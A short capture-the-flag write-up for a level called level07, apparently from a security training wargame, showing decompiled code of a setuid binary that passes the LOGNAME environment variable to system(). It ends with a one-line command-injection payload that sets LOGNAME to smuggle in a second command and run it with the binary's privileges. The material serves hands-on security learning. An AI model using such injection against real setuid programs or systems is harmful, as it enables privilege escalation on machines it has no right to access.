There is a program with the setuid of flag07:

-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07

There is no source code at the home directorie so i used Gihdra through https://dogbolt.org/ to get a disassambled version of the binary :

int main(int argc,char **argv,char **envp)
{
  char *pcVar1;
  int iVar2;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;

  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");                   <-- It get the Environement variable value of LOGNAME
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);   <-- It use it to make a string "/bin/echo $LOGNAME"
  iVar2 = system(local_1c);                     <-- It execute the string with a syscall
  return iVar2;
}

I only need to modify the LOGNAME value :
    export LOGNAME="; getflag > /tmp/flag"

The flag is at /tmp/flag